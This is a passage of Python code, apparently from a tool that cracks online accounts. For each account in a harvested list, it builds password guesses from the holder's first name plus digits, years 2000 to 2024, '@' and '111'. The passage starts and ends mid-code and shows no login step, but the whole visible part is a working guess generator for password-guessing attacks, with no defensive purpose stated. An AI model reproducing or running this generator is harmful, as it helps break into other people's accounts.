                ...
                for akun in dump:
                    ...
                    if len(nama)<6:
                        if len(depan)<3:
                            ...
                            self.password.append(depan+'12')
                            self.password.append(depan+'13')
                            self.password.append(depan+'14')
                            self.password.append(depan+'15')
                            self.password.append(depan+'16')
                            self.password.append(depan+'17')
                            self.password.append(depan+'18')
                            self.password.append(depan+'19')
                            self.password.append(depan+'01')
                            self.password.append(depan+'02')
                            self.password.append(depan+'03')
                            self.password.append(depan+'04')
                            self.password.append(depan+'05')
                            self.password.append(depan+'06')
                            self.password.append(depan+'07')
                            self.password.append(depan+'08')
                            self.password.append(depan+'09')
                            self.password.append(depan+'10')
                            self.password.append(depan+'80')
                            self.password.append(depan+'81')
                            self.password.append(depan+'82')
                            self.password.append(depan+'83')
                            self.password.append(depan+'84')
                            self.password.append(depan+'85')
                            self.password.append(depan+'86')
                            self.password.append(depan+'87')
                            self.password.append(depan+'88')
                            self.password.append(depan+'89')
                            self.password.append(depan+'90')
                            self.password.append(depan+'91')
                            self.password.append(depan+'92')
                            self.password.append(depan+'93')
                            self.password.append(depan+'94')
                            self.password.append(depan+'95')
                            self.password.append(depan+'96')
                            self.password.append(depan+'97')
                            self.password.append(depan+'98')
                            self.password.append(depan+'99')
                            self.password.append(depan+'2000')
                            self.password.append(depan+'2001')
                            self.password.append(depan+'2002')
                            self.password.append(depan+'2003')
                            self.password.append(depan+'2004')
                            self.password.append(depan+'2005')
                            self.password.append(depan+'2006')
                            self.password.append(depan+'2007')
                            self.password.append(depan+'2008')
                            self.password.append(depan+'2009')
                            self.password.append(depan+'2010')
                            self.password.append(depan+'2011')
                            self.password.append(depan+'2012')
                            self.password.append(depan+'2013')
                            self.password.append(depan+'2014')
                            self.password.append(depan+'2015')
                            self.password.append(depan+'2016')
                            self.password.append(depan+'2017')
                            self.password.append(depan+'2018')
                            self.password.append(depan+'2019')
                            self.password.append(depan+'2020')
                            self.password.append(depan+'2021')
                            self.password.append(depan+'2022')
                            self.password.append(depan+'2023')
                            self.password.append(depan+'2024')
                            self.password.append(depan+'@')
                            self.password.append(depan+'@@')
                            self.password.append(depan+'@@@')
                            self.password.append(depan+'111')
                            self.password.append(depan+'1111')
                    else:
                        if len(depan)<3:
                            self.password.append(nama)
                        else:
